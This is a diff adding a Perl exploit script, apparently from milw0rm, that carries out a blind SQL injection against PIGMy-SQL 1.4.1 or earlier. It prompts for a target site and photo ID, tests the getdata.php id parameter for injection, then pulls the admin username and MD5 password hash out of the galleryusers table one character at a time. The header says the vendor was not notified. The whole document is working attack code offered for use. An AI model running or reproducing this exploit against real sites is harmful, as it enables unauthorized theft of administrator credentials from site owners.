@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+
+# - PIGMy-SQL <= 1.4.1 Blind SQL Injection Exploit -
+# PIGMy-SQL is vulnerable because the mysql querys are insecure, therefor it allows an attack to execute sql querys, since the..
+#	..vulnerable page only returns a picture we have to use a blind sql script, heres a little one i coded below, it will be alot faster using things like sqlmap etc. but this does the job
+#
+# Discovered And Coded By: t0pP8uZz
+# Discovered On: April 4 2008
+# Vendor has not been notifed!
+# Admin login is at /admin/
+# passwords are encrypted in MD5
+# END OF
+
+use strict;
+use LWP::Simple;
+
+print "--------------------------------------------------\n";
+print "- PIGMy-SQL <= 1.4.1 Blind SQL Injection Exploit -\n";
+print "-         Coded And Discovered By t0pP8uZz       -\n";
+print "-                                                -\n";
+print "- This exploit will obtain the admin user/pass.. -\n";
+print "-        ..Using a blind sql injection attack    -\n";
+print "--------------------------------------------------\n";
+
+print "\nTarget Site: ";
+	chomp(my $url=<STDIN>);
+	
+print "Valid Photo ID: ";
+	chomp(my $pid=<STDIN>);
+
+if(inject_test($url, $pid)) {
+
+	print "\nInjecting Please Wait.. This could take several minutes.\n";
+	my $result = blindattack($url, $pid);
+	print "Exploited! Admin Details Are: ".$result;
+	exit;
+}
+
+sub blindattack {
+
+	my $url    = shift;
+	my $pid    = shift;
+	my $done   = 0;
+	my $substr = 1;
+	my $chr    = 48;
+	my $res    = undef;
+	
+	while($done == 0) {
+		my $content = get($url."/getdata.php?id=".$pid." and ascii(substring((select concat(name,0x3a,pass,0x5E) FROM galleryusers),".$substr.",1))=".$chr."/*");
+		
+		if($content =~ /#/ && $chr == 94) { $done = 1; }
+			elsif($content =~ /#/) { $res .= chr($chr); $substr++; $chr = 48; }
+				else { $chr++; }
+	}
+	return $res;
+}
+
+sub inject_test {
+
+	my $url = shift;
+	my $pid = shift;
+	
+	my $true  = get($url."/getdata.php?id=".$pid." and 1=1");
+	my $false = get($url."/getdata.php?id=".$pid." and 1=2");
+	
+	if($true =~ /#/ && $false !~ /#/) { 
+		print "\nTarget Vulnerable!";
+		return 1;
+	}
+	else {
+		print "Target not vulnerable! die'ing!";
+		exit;
+	}
+}
+
+# milw0rm.com [2008-04-04]
